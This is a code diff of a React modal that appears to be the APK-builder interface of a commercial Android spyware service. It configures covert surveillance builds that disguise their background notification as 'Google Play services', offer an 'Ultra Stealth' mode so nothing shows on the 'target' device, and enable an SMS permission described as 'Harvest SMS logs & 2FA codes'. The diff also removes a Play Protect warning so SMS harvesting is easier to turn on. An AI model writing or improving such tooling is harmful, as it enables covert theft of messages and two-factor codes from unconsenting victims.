@@ -185,11 +185,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setEnableNotificationListener(false);
             setUltraStealthMode(false);
             setShowStealthWarning(false);
-            setShowPlayProtectWarning(false);
             setAggressivePermissions(false);
             setShowAdvancedPermissions(false);
             setNotificationStyle("default");
-            setNotificationClickAction("device_info");
+            setNotificationClickAction("none");
             setNotificationIcon("info");
             setNotificationTitle("");
             setNotificationText("");
@@ -239,13 +238,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [ultraStealthMode, setUltraStealthMode] = useState(false);
     const [showStealthWarning, setShowStealthWarning] = useState(false);
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'location' | 'notifications' | 'foreground_notification' | null>(null);
-    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
     const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);
 
     // Notification Style States
     const [notificationStyle, setNotificationStyle] = useState("default");
-    const [notificationClickAction, setNotificationClickAction] = useState("device_info");
+    const [notificationClickAction, setNotificationClickAction] = useState("none");
     const [notificationIcon, setNotificationIcon] = useState("info");
     const [notificationTitle, setNotificationTitle] = useState("");
     const [notificationText, setNotificationText] = useState("");
@@ -259,7 +257,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             title: "Google Play services", 
             text: "Running background checks", 
             icon: "ℹ️",
-            defaultAction: "device_info",
+            defaultAction: "none",
             defaultIconKey: "info"
         },
         sync: { 
@@ -294,14 +292,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             title: "System Assistant", 
             text: "Ready", 
             icon: "ℹ️",
-            defaultAction: "device_info",
+            defaultAction: "none",
             defaultIconKey: "info"
         },
         custom: { 
             title: "Custom Title", 
             text: "Custom description text", 
             icon: "✏️",
-            defaultAction: "device_info",
+            defaultAction: "none",
             defaultIconKey: "info"
         },
     };
@@ -833,14 +831,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {/* ── STEP 2: Permissions Configuration (Tactile Full-Card Interactive Toggles) ── */}
                     {activeStep === 'permissions' && (
                         <div className="space-y-4">
-                            
-                            <div className="px-3 py-1 rounded-full bg-orange-500/15 border border-orange-500/30 flex items-center gap-2 w-fit">
-                                <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
-                                <span className="text-[10px] font-mono font-black uppercase tracking-wider text-orange-200">
-                                    Hardware & Sensor Permissions
-                                </span>
-                            </div>
-
                             <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 sm:gap-3">
                                 
                                 {/* Storage Permission Card */}
@@ -1039,13 +1029,53 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </div>
                                 </div>
 
+                                {/* SMS Messages Permission Card */}
+                                <div 
+                                    onClick={() => {
+                                        if (isBasicPlan) { onUpgrade?.('SMS Messages', 'standard'); return; }
+                                        setEnableSmsPermission(!enableSmsPermission);
+                                    }}
+                                    className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
+                                        enableSmsPermission && !isBasicPlan
+                                            ? 'bg-rose-500/10 border-2 border-rose-500/60 shadow-[0_0_16px_rgba(244,63,94,0.2)]' 
+                                            : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-70 hover:opacity-100'
+                                    }`}
+                                >
+                                    <div className="flex items-center gap-3 min-w-0">
+                                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
+                                            enableSmsPermission && !isBasicPlan ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40' : 'bg-white/5 text-white/40'
+                                        }`}>
+                                            <MessageSquare size={18} />
+                                        </div>
+                                        <div className="flex flex-col min-w-0">
+                                            <div className="flex items-center gap-1.5">
+                                                <span className={`text-xs font-black truncate ${enableSmsPermission && !isBasicPlan ? 'text-rose-200' : 'text-white'}`}>
+                                                    SMS Messages
+                                                </span>
+                                                {isBasicPlan && <Lock size={11} className="text-orange-400/80" />}
+                                                <button 
+                                                    type="button" 
+                                                    onClick={(e) => { e.stopPropagation(); setShowPermissionInfo('sms'); }} 
+                                                    className="text-white/40 hover:text-rose-300 p-0.5"
+                                                >
+                                                    <Info size={12} />
+                                                </button>
+                                            </div>
+                                            <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Harvest SMS logs & 2FA codes</span>
+                                        </div>
+                                    </div>
+                                    <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableSmsPermission && !isBasicPlan ? 'bg-rose-500 shadow-[0_0_8px_#f43f5e]' : 'bg-white/10'}`}>
+                                        <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableSmsPermission && !isBasicPlan ? 'translate-x-5' : 'translate-x-0'}`} />
+                                    </div>
+                                </div>
+
                                 {/* Notification Reader Permission Card */}
                                 <div 
                                     onClick={() => {
                                         if (isBasicPlan) { onUpgrade?.('Notification Reader', 'standard'); return; }
                                         setEnableNotificationListener(!enableNotificationListener);
                                     }}
-                                    className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
+                                    className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none sm:col-span-2 ${
                                         enableNotificationListener && isStandard
                                             ? 'bg-sky-500/10 border-2 border-sky-500/60 shadow-[0_0_16px_rgba(14,165,233,0.2)]' 
                                             : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-70 hover:opacity-100'
@@ -1089,7 +1119,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 >
                                     <div className="flex items-center gap-2">
                                         <Sliders size={14} />
-                                        <span>Advanced Stealth & Notification Options</span>
+                                        <span>Advanced Stealth Options</span>
                                     </div>
                                     {showAdvancedPermissions ? <ChevronUp size={14} /> : <ChevronDown size={14} />}
                                 </button>
@@ -1139,50 +1169,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             </div>
                                             <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${ultraStealthMode ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/10'}`}>
                                                 <div className={`w-5 h-5 bg-white rounded-full transition-transform ${ultraStealthMode ? 'translate-x-5' : 'translate-x-0'}`} />
-                                            </div>
-                                        </div>
-
-                                        {/* SMS Access */}
-                                        <div 
-                                            onClick={() => {
-                                                if (isBasicPlan) { onUpgrade?.('SMS Messages', 'standard'); return; }
-                                                if (!enableSmsPermission) {
-                                                    setShowPlayProtectWarning(true);
-                                                } else {
-                                                    setEnableSmsPermission(false);
-                                                }
-                                            }}
-                                            className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
-                                                enableSmsPermission && !isBasicPlan
-                                                    ? 'bg-rose-500/10 border-2 border-rose-500/60 shadow-[0_0_16px_rgba(244,63,94,0.2)]' 
-                                                    : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-70 hover:opacity-100'
-                                            }`}
-                                        >
-                                            <div className="flex items-center gap-3 min-w-0">
-                                                <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
-                                                    enableSmsPermission && !isBasicPlan ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40' : 'bg-white/5 text-white/40'
-                                                }`}>
-                                                    <MessageSquare size={18} />
-                                                </div>
-                                                <div className="flex flex-col min-w-0">
-                                                    <div className="flex items-center gap-1.5">
-                                                        <span className={`text-xs font-black truncate ${enableSmsPermission && !isBasicPlan ? 'text-rose-200' : 'text-white'}`}>
-                                                            SMS Messages
-                                                        </span>
-                                                        {isBasicPlan && <Lock size={11} className="text-orange-400/80" />}
-                                                        <button 
-                                                            type="button" 
-                                                            onClick={(e) => { e.stopPropagation(); setShowPermissionInfo('sms'); }} 
-                                                            className="text-white/40 hover:text-rose-300 p-0.5"
-                                                        >
-                                                            <Info size={12} />
-                                                        </button>
-                                                    </div>
-                                                    <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Harvest SMS logs & 2FA codes</span>
-                                                </div>
-                                            </div>
-                                            <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableSmsPermission && !isBasicPlan ? 'bg-rose-500 shadow-[0_0_8px_#f43f5e]' : 'bg-white/10'}`}>
-                                                <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableSmsPermission && !isBasicPlan ? 'translate-x-5' : 'translate-x-0'}`} />
                                             </div>
                                         </div>
 
@@ -1261,19 +1247,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             ) : (
                                 /* ── CAMOUFLAGE STATE (Notification Enabled) ── */
                                 <>
-                                    <div className="flex items-center justify-between gap-2 flex-wrap">
-                                        <div className="px-3 py-1 rounded-full bg-orange-500/15 border border-orange-500/30 flex items-center gap-2 w-fit">
-                                            <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
-                                            <span className="text-[10px] font-mono font-black uppercase tracking-wider text-orange-200">
-                                                Background Service Camouflage
-                                            </span>
-                                        </div>
-                                        <span className="px-2.5 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-[10px] font-mono font-extrabold text-emerald-300 flex items-center gap-1.5">
-                                            <Shield size={11} />
-                                            24/7 CLOAK ACTIVE
-                                        </span>
-                                    </div>
-
                                     {/* Dropdown 1: Style */}
                                     <div className="relative">
                                         <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
@@ -1586,92 +1559,47 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     </div>
                 )}
 
-                {/* Play Protect Warning Modal */}
-                {showPlayProtectWarning && (
-                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[350] p-4" onClick={() => setShowPlayProtectWarning(false)}>
-                        <div className="bg-[#18191c] rounded-3xl p-5 sm:p-6 max-w-sm w-full border border-red-500/30 shadow-2xl space-y-3.5" onClick={(e) => e.stopPropagation()}>
-                            <div className="flex items-center gap-3">
-                                <div className="w-9 h-9 rounded-xl bg-red-500/20 text-red-400 border border-red-500/40 flex items-center justify-center">
-                                    <AlertTriangle size={18} />
-                                </div>
-                                <div>
-                                    <h3 className="text-sm font-bold text-white">Play Protect Heuristic Note</h3>
-                                    <p className="text-[10px] text-red-400 font-mono">SMS Permission Flag</p>
-                                </div>
-                            </div>
-
-                            <p className="text-white/70 text-xs leading-relaxed font-sans">
-                                Enabling <strong>SMS Access</strong> requires the target to approve sensitive text permissions during installation.
-                            </p>
-
-                            <div className="flex gap-2">
-                                <button
-                                    type="button"
-                                    onClick={() => setShowPlayProtectWarning(false)}
-                                    className="flex-1 py-2 rounded-xl bg-white/5 hover:bg-white/10 text-white/60 hover:text-white text-xs font-bold transition-colors cursor-pointer border border-white/10"
-                                >
-                                    Cancel
-                                </button>
-                                <button
-                                    type="button"
-                                    onClick={() => {
-                                        setEnableSmsPermission(true);
-                                        setShowPlayProtectWarning(false);
-                                    }}
-                                    className="flex-1 py-2 rounded-xl bg-red-500/20 hover:bg-red-500/30 border border-red-500/40 text-red-300 hover:text-white text-xs font-bold transition-colors cursor-pointer"
-                                >
-                                    Enable SMS
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                )}
-
                 {/* Ultra Stealth Mode Warning Modal */}
                 {showStealthWarning && (
                     <div className="fixed inset-0 z-[360] flex items-center justify-center bg-black/85 backdrop-blur-md p-4" onClick={() => setShowStealthWarning(false)}>
-                        <div className="bg-[#14161b] border border-amber-500/35 rounded-3xl p-6 sm:p-7 max-w-md w-full space-y-4 relative shadow-[0_20px_60px_rgba(0,0,0,0.9)] overflow-hidden" onClick={(e) => e.stopPropagation()}>
-                            {/* Subtle Ambient Glow */}
-                            <div className="absolute top-0 right-0 w-36 h-36 bg-amber-500/10 rounded-full blur-3xl pointer-events-none" />
+                        <div className="bg-[#14161b] border border-amber-500/35 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-3.5 relative shadow-[0_20px_60px_rgba(0,0,0,0.9)] overflow-hidden" onClick={(e) => e.stopPropagation()}>
+                            {/* Ambient Glow */}
+                            <div className="absolute top-0 right-0 w-32 h-32 bg-amber-500/10 rounded-full blur-2xl pointer-events-none" />
 
                             <button
                                 onClick={() => setShowStealthWarning(false)}
-                                className="w-8 h-8 rounded-xl bg-white/5 hover:bg-white/10 flex items-center justify-center absolute top-4 right-4 text-white/50 hover:text-white cursor-pointer transition-colors border border-white/10"
+                                className="w-7 h-7 rounded-xl bg-white/5 hover:bg-white/10 flex items-center justify-center absolute top-4 right-4 text-white/50 hover:text-white cursor-pointer transition-colors border border-white/10"
                             >
-                                <X size={14} />
+                                <X size={13} />
                             </button>
 
-                            <div className="flex items-center gap-3.5">
-                                <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-amber-500/25 to-orange-500/10 text-amber-300 border border-amber-500/40 flex items-center justify-center shrink-0 shadow-[0_0_16px_rgba(245,158,11,0.25)]">
-                                    <EyeOff size={22} />
+                            <div className="flex items-center gap-3">
+                                <div className="w-10 h-10 rounded-2xl bg-amber-500/20 text-amber-300 border border-amber-500/40 flex items-center justify-center shrink-0 shadow-[0_0_12px_rgba(245,158,11,0.25)]">
+                                    <EyeOff size={20} />
                                 </div>
                                 <div className="min-w-0">
-                                    <h4 className="text-sm sm:text-base font-black text-white tracking-tight">Ultra Stealth Activation</h4>
-                                    <span className="text-[10px] font-mono text-amber-300">Visibility vs. Background Longevity</span>
+                                    <h4 className="text-sm font-black text-white tracking-tight">Enable Ultra Stealth?</h4>
+                                    <span className="text-[10px] font-mono text-amber-300">100% Invisible Mode</span>
                                 </div>
                             </div>
 
-                            <div className="p-4 rounded-2xl bg-black/50 border border-white/10 space-y-3 shadow-inner">
+                            <div className="p-3.5 rounded-2xl bg-black/50 border border-white/10 space-y-2.5 shadow-inner">
                                 <p className="text-xs text-white/80 leading-relaxed font-sans">
-                                    Hiding the notification makes the APK <strong className="text-amber-300">100% invisible</strong>: no runtime notification permission will be requested, and zero icons will appear in the target status bar.
+                                    Zero status bar icons and no runtime notification prompt will appear on the device.
                                 </p>
                                 
-                                <div className="p-3 rounded-xl bg-amber-500/10 border border-amber-500/20 text-[11px] text-amber-200/90 font-mono leading-relaxed">
-                                    ⚠️ <strong>Note:</strong> On aggressive OEMs (Xiaomi, Samsung), disabling the status bar notification may reduce continuous 24/7 background uptime under heavy memory load.
-                                </div>
-
-                                <div className="text-[11px] text-emerald-400 font-mono">
-                                    💡 <strong>Recommended:</strong> Keep OFF for guaranteed 24/7 disguised uptime.
+                                <div className="p-2 rounded-xl bg-amber-500/10 border border-amber-500/20 text-[11px] text-amber-200/90 font-mono leading-tight">
+                                    ⚠️ Background service may pause on some devices under low RAM.
                                 </div>
                             </div>
 
-                            <div className="flex flex-col sm:flex-row items-center gap-2.5 pt-2">
+                            <div className="flex items-center gap-2 pt-1">
                                 <button
                                     type="button"
                                     onClick={() => setShowStealthWarning(false)}
-                                    className="w-full sm:flex-1 py-3 px-4 rounded-xl bg-[#20232b] hover:bg-[#282c37] border border-white/10 text-white/90 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-md text-center"
+                                    className="flex-1 py-2.5 px-3 rounded-xl bg-[#20232b] hover:bg-[#282c37] border border-white/10 text-white/90 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-md text-center"
                                 >
-                                    Keep Standard (24/7)
+                                    Keep (24/7)
                                 </button>
                                 <button
                                     type="button"
@@ -1679,9 +1607,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         setUltraStealthMode(true);
                                         setShowStealthWarning(false);
                                     }}
-                                    className="w-full sm:flex-1 py-3 px-4 rounded-xl bg-gradient-to-r from-amber-500 via-orange-500 to-amber-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(245,158,11,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
+                                    className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-amber-500 via-orange-500 to-amber-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(245,158,11,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
                                 >
-                                    <EyeOff size={14} /> Activate Stealth
+                                    <EyeOff size={13} /> Enable Stealth
                                 </button>
                             </div>
                         </div>
